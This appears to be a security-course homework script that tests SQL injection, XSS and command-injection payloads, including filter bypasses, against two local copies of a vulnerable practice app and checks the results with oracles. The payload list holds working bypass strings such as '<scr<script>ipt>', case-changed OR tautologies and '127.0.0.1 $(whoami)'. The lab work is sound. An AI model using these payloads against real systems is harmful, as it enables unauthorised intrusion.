"""Part A: confirm SQLi, XSS and cmdi at Medium, each with a filter bypass.

Every payload is fired at two copies of the real app on 127.0.0.1:
  low    = plain vuln-web (no filter)
  medium = vuln-web behind the DVWA-style filters in medium_app.py
and judged by a seclab.attack oracle (canary leak / live <script> / metachar
reaching the command). 3 trials each, to show the results are deterministic.

    python3 attack/attack.py          # from homework/hw2/soto/
"""
import sys
from pathlib import Path

HERE = Path(__file__).resolve()
sys.path[:0] = [str(HERE.parents[1]), str(HERE.parent)]
import common as c                                  # noqa: E402
from medium_app import MediumHandler                # noqa: E402

OWASP = "A03:2021 Injection"

# (family, role, payload, technique)
PAYLOADS = [
    ("sqli", "naive",  "admin' OR '1'='1", "classic tautology"),
    ("sqli", "naive",  "admin'--",         "comment out the password check"),
    ("sqli", "bypass", "admin' oR '1'='1", "case: filter only strips ' OR '/' or '"),
    ("sqli", "bypass", "admin'OR'1'='1",   "whitespace: filter needs spaces around OR"),
    ("sqli", "bypass", "admin'/*",         "comment: SQLite accepts an unterminated /* */"),
    ("sqli", "bypass", "admin'-#-",        "filter order: '#' removed after '--' leaves '--'"),
    ("sqli", "benign", "alice",            "negative control"),
    ("xss",  "naive",  "<script>alert(1)</script>", "classic script tag"),
    ("xss",  "bypass", "<scr<script>ipt>alert(1)</script>", "nesting: removal rebuilds the tag"),
    ("xss",  "bypass", "<SCRIPT>alert(1)</SCRIPT>", "case: str_replace is case-sensitive"),
    ("xss",  "benign", "Panic! at the Disco tickets", "negative control"),
    ("cmdi", "naive",  "127.0.0.1; whoami",  "';' separator"),
    ("cmdi", "naive",  "127.0.0.1 && whoami", "'&&' chaining"),
    ("cmdi", "bypass", "127.0.0.1 | whoami", "pipe is not on the blocklist"),
    ("cmdi", "bypass", "127.0.0.1 & whoami", "single '&' (background) not on the list"),
    ("cmdi", "bypass", "127.0.0.1 $(whoami)", "command substitution not on the list"),
    ("cmdi", "bypass", "127.0.0.1 &;& whoami", "filter order: removing ';' rebuilds '&&'"),
    ("cmdi", "benign", "example.com",        "negative control"),
]


def fire(base, family, payload):
    send, oracle = {
        "sqli": (c.login_sender(base), c.sqli_oracle),
        "xss":  (c.reflect_sender(base), c.xss_oracle),
        "cmdi": (c.ping_sender(base), c.cmdi_oracle),
    }[family]
    return c.run_payloads([c.Payload(payload, family=family)], send=send,
                          oracle=oracle, trials=3)[0]


def main():
    low, stop_low = c.serve()
    med, stop_med = c.serve(MediumHandler)
    rows = []
    try:
        print(f"  {'family':<5} {'role':<7} {'low':<5} {'medium':<6} payload")
        for family, role, payload, technique in PAYLOADS:
            fl, fm = fire(low, family, payload), fire(med, family, payload)
            print(f"  {family:<5} {role:<7} {fl.successes}/3   {fm.successes}/3    {payload!r}")
            rows.append({"family": family, "owasp": OWASP, "role": role,
                         "payload": payload, "technique": technique,
                         "low_confirmed": f"{fl.successes}/3",
                         "medium_confirmed": f"{fm.successes}/3",
                         "medium_evidence": fm.evidence})
    finally:
        stop_low()
        stop_med()

    c.write_csv("attack_results.csv", rows)
    by = {(r["family"], r["role"]): [] for r in rows}
    for r in rows:
        by[(r["family"], r["role"])].append(r["medium_confirmed"] == "3/3")
    for fam in ("sqli", "xss", "cmdi"):
        # The claim: naive payloads die at Medium, every bypass lands, benign never confirms.
        assert not any(by[(fam, "naive")]), f"{fam}: a naive payload got through Medium"
        assert all(by[(fam, "bypass")]), f"{fam}: a bypass failed at Medium"
        assert not any(by[(fam, "benign")]), f"{fam}: oracle confirmed benign input"
    print("\n  PART A OK: 3 classes confirmed at Medium only via bypass; "
          "naive payloads blocked; negative controls clean.")


if __name__ == "__main__":
    main()
